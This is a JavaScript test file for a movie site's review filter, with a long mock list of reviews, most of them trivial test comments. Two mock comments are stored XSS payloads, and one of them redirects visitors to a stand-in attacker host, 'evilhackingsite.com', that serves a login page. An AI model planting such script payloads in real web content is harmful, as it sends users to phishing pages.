import {allVerifedReviews }from "../public/js/func/fetchVerifiedReviews.js";

test("check that every review on moviepage that is showing is verified === true", async () => {
  const verifedData = await allVerifedReviews(mockData);

  let isTrue = 0;
  verifedData.forEach((review) => {
    if (review.attributes.verified === true) isTrue++;
  });
  expect(isTrue).toEqual(verifedData.length);
});

function mockData() {
  return {
    data: [
      {
        id: 34,
        attributes: {
          comment: "I like this movie!",
          rating: 0,
          author: "Richard",
          verified: null,
          createdAt: "2022-01-27T08:58:22.801Z",
          updatedAt: "2022-01-27T08:58:22.801Z",
        },
      },
      {
        id: 35,
        attributes: {
          comment: "This movie is interesting",
          rating: 0,
          author: "Lisa",
          verified: null,
          createdAt: "2022-01-27T08:58:40.430Z",
          updatedAt: "2022-01-27T08:58:40.430Z",
        },
      },
      {
        id: 45,
        attributes: {
          comment: "I think this is a great movie!",
          rating: 0,
          author: "Richard Olsson",
          verified: null,
          createdAt: "2022-01-27T12:31:15.562Z",
          updatedAt: "2022-01-27T12:31:15.562Z",
        },
      },
      {
        id: 46,
        attributes: {
          comment: "I think this is a great movie!",
          rating: 0,
          author: "Richard Olsson",
          verified: null,
          createdAt: "2022-01-27T12:31:32.839Z",
          updatedAt: "2022-01-27T12:31:32.839Z",
        },
      },
      {
        id: 51,
        attributes: {
          comment: "This is a review from other site. I have been hacked!",
          rating: 0,
          author: "Hacker (on same page)",
          verified: null,
          createdAt: "2022-01-27T13:10:26.152Z",
          updatedAt: "2022-01-27T13:10:26.152Z",
        },
      },
      {
        id: 56,
        attributes: {
          comment: "This is a great movie!",
          rating: 0,
          author: "Richard",
          verified: null,
          createdAt: "2022-01-27T13:24:19.980Z",
          updatedAt: "2022-01-27T13:24:19.980Z",
        },
      },
      {
        id: 58,
        attributes: {
          comment: "This is a review from other site. I have been hacked!",
          rating: 0,
          author: "Richard",
          verified: null,
          createdAt: "2022-01-27T13:27:11.595Z",
          updatedAt: "2022-01-27T13:27:11.595Z",
        },
      },
      {
        id: 59,
        attributes: {
          comment: "Another review!",
          rating: 0,
          author: "Richard",
          verified: null,
          createdAt: "2022-01-27T13:32:27.339Z",
          updatedAt: "2022-01-27T13:32:27.339Z",
        },
      },
      {
        id: 60,
        attributes: {
          comment: "This is a review from other site. I have been hacked!",
          rating: 0,
          author: null,
          verified: null,
          createdAt: "2022-01-27T13:33:19.051Z",
          updatedAt: "2022-01-27T13:33:19.051Z",
        },
      },
      {
        id: 61,
        attributes: {
          comment: "<script>console.log('hello');</script>",
          rating: 0,
          author: "Richard",
          verified: null,
          createdAt: "2022-01-27T13:46:28.313Z",
          updatedAt: "2022-01-27T13:46:28.313Z",
        },
      },
      {
        id: 62,
        attributes: {
          comment:
            "<script>location.href='http://evilhackingsite.com:6660/login.html';</script>",
          rating: 0,
          author: null,
          verified: null,
          createdAt: "2022-01-27T13:47:46.634Z",
          updatedAt: "2022-01-27T13:47:46.634Z",
        },
      },
      {
        id: 64,
        attributes: {
          comment: "testing",
          rating: 3,
          author: "Johan",
          verified: true,
          createdAt: "2022-01-29T11:56:20.052Z",
          updatedAt: "2022-01-29T11:56:20.052Z",
        },
      },
      {
        id: 65,
        attributes: {
          comment: "Bästigaste filmen",
          rating: 5,
          author: "Johan",
          verified: true,
          createdAt: "2022-01-30T20:38:06.676Z",
          updatedAt: "2022-01-30T20:38:06.676Z",
        },
      },
      {
        id: 73,
        attributes: {
          comment: "This is a test comment!",
          rating: 2,
          author: "Test",
          verified: null,
          createdAt: "2022-01-31T11:20:10.045Z",
          updatedAt: "2022-01-31T11:20:10.045Z",
        },
      },
      {
        id: 76,
        attributes: {
          comment: "Test",
          rating: 4,
          author: "John Doe",
          verified: null,
          createdAt: "2022-01-31T15:01:31.793Z",
          updatedAt: "2022-01-31T15:01:31.793Z",
        },
      },
      {
        id: 77,
        attributes: {
          comment: "Test",
          rating: 4,
          author: "John Doe",
          verified: null,
          createdAt: "2022-01-31T15:01:38.398Z",
          updatedAt: "2022-01-31T15:01:38.398Z",
        },
      },
      {
        id: 78,
        attributes: {
          comment: "Test",
          rating: 4,
          author: "John Doe",
          verified: null,
          createdAt: "2022-01-31T15:01:39.050Z",
          updatedAt: "2022-01-31T15:01:39.050Z",
        },
      },
      {
        id: 87,
        attributes: {
          comment: "Greatest Moviest. You heard me",
          rating: 5,
          author: "Johan Herokusson",
          verified: null,
          createdAt: "2022-02-01T09:24:56.782Z",
          updatedAt: "2022-02-01T09:24:56.782Z",
        },
      },
      {
        id: 89,
        attributes: {
          comment: "Greatest Moviest. You heard me",
          rating: 5,
          author: "Johan Testsson",
          verified: null,
          createdAt: "2022-02-01T09:28:57.504Z",
          updatedAt: "2022-02-01T09:28:57.504Z",
        },
      },
      {
        id: 92,
        attributes: {
          comment: "Greatest Moviest. You heard me",
          rating: 5,
          author: "Johan Herokusson",
          verified: null,
          createdAt: "2022-02-01T09:42:25.178Z",
          updatedAt: "2022-02-01T09:42:25.178Z",
        },
      },
      {
        id: 93,
        attributes: {
          comment: "Greatest Moviest. You heard me",
          rating: 5,
          author: "Johan Herokusson",
          verified: null,
          createdAt: "2022-02-01T09:42:51.987Z",
          updatedAt: "2022-02-01T09:42:51.987Z",
        },
      },
      {
        id: 94,
        attributes: {
          comment: "Greatest Moviest. You heard me",
          rating: 5,
          author: "Johan",
          verified: null,
          createdAt: "2022-02-01T09:44:06.038Z",
          updatedAt: "2022-02-01T09:44:06.038Z",
        },
      },
      {
        id: 95,
        attributes: {
          comment: "Greatest Moviest. You heard me",
          rating: 5,
          author: "Johan Herokusson",
          verified: null,
          createdAt: "2022-02-01T09:48:21.585Z",
          updatedAt: "2022-02-01T09:48:21.585Z",
        },
      },
      {
        id: 96,
        attributes: {
          comment: "Greatest Moviest. You heard me",
          rating: 5,
          author: "Johan Herokusson",
          verified: null,
          createdAt: "2022-02-01T09:50:06.751Z",
          updatedAt: "2022-02-01T09:50:06.751Z",
        },
      },
      {
        id: 129,
        attributes: {
          comment: "Bestest Movie",
          rating: 5,
          author: "Johan Herokusson",
          verified: null,
          createdAt: "2022-02-01T13:58:58.449Z",
          updatedAt: "2022-02-01T13:58:58.449Z",
        },
      },
      {
        id: 131,
        attributes: {
          comment: "123",
          rating: 5,
          author: "Johan Herokusson",
          verified: null,
          createdAt: "2022-02-01T14:17:48.088Z",
          updatedAt: "2022-02-01T14:17:48.088Z",
        },
      },
      {
        id: 132,
        attributes: {
          comment: "123",
          rating: 5,
          author: "Johan Herokusson",
          verified: null,
          createdAt: "2022-02-01T14:18:34.869Z",
          updatedAt: "2022-02-01T14:18:34.869Z",
        },
      },
      {
        id: 133,
        attributes: {
          comment: "123",
          rating: 5,
          author: "Johan Herokusson",
          verified: null,
          createdAt: "2022-02-01T14:18:59.310Z",
          updatedAt: "2022-02-01T14:18:59.310Z",
        },
      },
      {
        id: 134,
        attributes: {
          comment: "123",
          rating: 1,
          author: "John",
          verified: null,
          createdAt: "2022-02-01T14:20:01.408Z",
          updatedAt: "2022-02-01T14:20:01.408Z",
        },
      },
      {
        id: 135,
        attributes: {
          comment: "123",
          rating: 2,
          author: "123",
          verified: null,
          createdAt: "2022-02-01T14:20:46.110Z",
          updatedAt: "2022-02-01T14:20:46.110Z",
        },
      },
      {
        id: 136,
        attributes: {
          comment: "Bestest Moviest. You heard me",
          rating: 5,
          author: "Johan Herokusson",
          verified: null,
          createdAt: "2022-02-01T14:25:34.616Z",
          updatedAt: "2022-02-01T14:25:34.616Z",
        },
      },
      {
        id: 137,
        attributes: {
          comment: "Bestest Movies. You heard me",
          rating: 5,
          author: "Johan Herokusson",
          verified: null,
          createdAt: "2022-02-01T14:29:28.693Z",
          updatedAt: "2022-02-01T14:29:28.693Z",
        },
      },
      {
        id: 138,
        attributes: {
          comment: "123123",
          rating: 3,
          author: "David",
          verified: null,
          createdAt: "2022-02-01T14:35:04.678Z",
          updatedAt: "2022-02-01T14:35:04.678Z",
        },
      },
      {
        id: 152,
        attributes: {
          comment: "The best movie I've never seen ",
          rating: 5,
          author: "E",
          verified: null,
          createdAt: "2022-02-01T17:23:03.992Z",
          updatedAt: "2022-02-01T17:23:03.992Z",
        },
      },
      {
        id: 155,
        attributes: {
          comment: "ok",
          rating: 3,
          author: "banan",
          verified: null,
          createdAt: "2022-02-01T17:31:14.713Z",
          updatedAt: "2022-02-01T17:31:14.713Z",
        },
      },
      {
        id: 168,
        attributes: {
          comment: "Batman is awesome",
          rating: 4,
          author: "logged in user",
          verified: null,
          createdAt: "2022-02-01T21:29:22.169Z",
          updatedAt: "2022-02-01T21:29:22.169Z",
        },
      },
      {
        id: 177,
        attributes: {
          comment: "bat can fly",
          rating: 5,
          author: "haeju",
          verified: true,
          createdAt: "2022-02-02T09:26:43.391Z",
          updatedAt: "2022-02-02T09:26:43.391Z",
        },
      },
      {
        id: 178,
        attributes: {
          comment: "bat can fly indeed",
          rating: 4,
          author: "haeju2",
          verified: true,
          createdAt: "2022-02-02T09:28:08.297Z",
          updatedAt: "2022-02-02T09:28:08.297Z",
        },
      },
      {
        id: 182,
        attributes: {
          comment: "can't i leave a review",
          rating: 2,
          author: "why",
          verified: true,
          createdAt: "2022-02-02T09:32:32.643Z",
          updatedAt: "2022-02-02T09:32:32.643Z",
        },
      },
      {
        id: 183,
        attributes: {
          comment: "can I leave a review now?!?!?!",
          rating: 4,
          author: "annyeong",
          verified: true,
          createdAt: "2022-02-02T09:33:46.519Z",
          updatedAt: "2022-02-02T09:33:46.519Z",
        },
      },
      {
        id: 184,
        attributes: {
          comment: "plz work",
          rating: 4,
          author: "testing",
          verified: true,
          createdAt: "2022-02-02T09:47:23.135Z",
          updatedAt: "2022-02-02T09:47:23.135Z",
        },
      },
      {
        id: 224,
        attributes: {
          comment: "",
          rating: 0,
          author: "",
          verified: true,
          createdAt: "2022-02-02T15:04:55.349Z",
          updatedAt: "2022-02-02T15:04:55.349Z",
        },
      },
      {
        id: 225,
        attributes: {
          comment: "Good",
          rating: 4,
          author: "Johan Doe",
          verified: true,
          createdAt: "2022-02-02T15:06:42.909Z",
          updatedAt: "2022-02-02T15:06:42.909Z",
        },
      },
      {
        id: 226,
        attributes: {
          comment: "Good",
          rating: 4,
          author: "Johan Doe",
          verified: true,
          createdAt: "2022-02-02T15:06:44.170Z",
          updatedAt: "2022-02-02T15:06:44.170Z",
        },
      },
      {
        id: 227,
        attributes: {
          comment: "Nah",
          rating: 2,
          author: "Johan Herokusson",
          verified: true,
          createdAt: "2022-02-02T15:07:14.348Z",
          updatedAt: "2022-02-02T15:07:14.348Z",
        },
      },
      {
        id: 229,
        attributes: {
          comment: "Nah",
          rating: 2,
          author: "Johan Herokusson",
          verified: true,
          createdAt: "2022-02-02T15:08:20.698Z",
          updatedAt: "2022-02-02T15:08:20.698Z",
        },
      },
      {
        id: 230,
        attributes: {
          comment: "Nah",
          rating: 2,
          author: "Johan Herokusson",
          verified: true,
          createdAt: "2022-02-02T15:08:27.335Z",
          updatedAt: "2022-02-02T15:08:27.335Z",
        },
      },
      {
        id: 231,
        attributes: {
          comment: "123",
          rating: 3,
          author: "123",
          verified: true,
          createdAt: "2022-02-02T15:09:54.617Z",
          updatedAt: "2022-02-02T15:09:54.617Z",
        },
      },
      {
        id: 232,
        attributes: {
          comment: "123",
          rating: 3,
          author: "123",
          verified: true,
          createdAt: "2022-02-02T15:10:39.930Z",
          updatedAt: "2022-02-02T15:10:39.930Z",
        },
      },
      {
        id: 233,
        attributes: {
          comment: "",
          rating: 0,
          author: "",
          verified: true,
          createdAt: "2022-02-02T15:12:03.940Z",
          updatedAt: "2022-02-02T15:12:03.940Z",
        },
      },
      {
        id: 234,
        attributes: {
          comment: "",
          rating: 0,
          author: "",
          verified: true,
          createdAt: "2022-02-02T15:12:17.755Z",
          updatedAt: "2022-02-02T15:12:17.755Z",
        },
      },
      {
        id: 235,
        attributes: {
          comment: "",
          rating: 0,
          author: "",
          verified: true,
          createdAt: "2022-02-02T15:13:11.355Z",
          updatedAt: "2022-02-02T15:13:11.355Z",
        },
      },
      {
        id: 236,
        attributes: {
          comment: "123",
          rating: 1,
          author: "Johan Herokusson",
          verified: true,
          createdAt: "2022-02-02T15:27:03.402Z",
          updatedAt: "2022-02-02T15:27:03.402Z",
        },
      },
      {
        id: 237,
        attributes: {
          comment: "",
          rating: 0,
          author: "",
          verified: true,
          createdAt: "2022-02-02T15:43:44.598Z",
          updatedAt: "2022-02-02T15:43:44.598Z",
        },
      },
      {
        id: 238,
        attributes: {
          comment: "",
          rating: 0,
          author: "",
          verified: true,
          createdAt: "2022-02-02T15:43:59.133Z",
          updatedAt: "2022-02-02T15:43:59.133Z",
        },
      },
      {
        id: 239,
        attributes: {
          comment: "Good",
          rating: 3,
          author: "Johan Herokusson",
          verified: true,
          createdAt: "2022-02-02T15:44:07.959Z",
          updatedAt: "2022-02-02T15:44:07.959Z",
        },
      },
      {
        id: 241,
        attributes: {
          comment: "simply brilliant",
          rating: 5,
          author: "Ytterhogdal",
          verified: null,
          createdAt: "2022-02-02T17:45:11.860Z",
          updatedAt: "2022-02-02T17:45:11.860Z",
        },
      },
      {
        id: 242,
        attributes: {
          comment: "Test",
          rating: 5,
          author: "Test",
          verified: null,
          createdAt: "2022-02-02T18:00:19.674Z",
          updatedAt: "2022-02-02T18:00:19.674Z",
        },
      },
      {
        id: 243,
        attributes: {
          comment: "Hej",
          rating: 5,
          author: "Bravo",
          verified: null,
          createdAt: "2022-02-02T18:18:16.640Z",
          updatedAt: "2022-02-02T18:18:16.640Z",
        },
      },
      {
        id: 249,
        attributes: {
          comment: "Fanastic! I am so cool and ... I mean Batman is so cool",
          rating: 5,
          author: "Bruce",
          verified: null,
          createdAt: "2022-02-02T18:41:27.824Z",
          updatedAt: "2022-02-02T18:41:27.824Z",
        },
      },
      {
        id: 252,
        attributes: {
          comment: "Thank you!",
          rating: 5,
          author: "B",
          verified: null,
          createdAt: "2022-02-02T18:47:57.938Z",
          updatedAt: "2022-02-02T18:47:57.938Z",
        },
      },
      {
        id: 256,
        attributes: {
          comment: "bleh",
          rating: 1,
          author: "ee",
          verified: true,
          createdAt: "2022-02-02T20:38:54.908Z",
          updatedAt: "2022-02-02T20:38:54.908Z",
        },
      },
      {
        id: 262,
        attributes: {
          comment: "Very nice movie",
          rating: 5,
          author: "B",
          verified: null,
          createdAt: "2022-02-02T20:59:51.923Z",
          updatedAt: "2022-02-02T20:59:51.923Z",
        },
      },
      {
        id: 265,
        attributes: {
          comment: "Batman!",
          rating: 5,
          author: "Robin",
          verified: null,
          createdAt: "2022-02-02T21:15:55.872Z",
          updatedAt: "2022-02-02T21:15:55.872Z",
        },
      },
      {
        id: 272,
        attributes: {
          comment: "Needs some more action",
          rating: 4,
          author: "Joker",
          verified: null,
          createdAt: "2022-02-03T11:16:13.201Z",
          updatedAt: "2022-02-03T11:16:13.201Z",
        },
      },
    ],
    meta: { pagination: { page: 1, pageSize: 65, pageCount: 1, total: 65 } },
  };
}
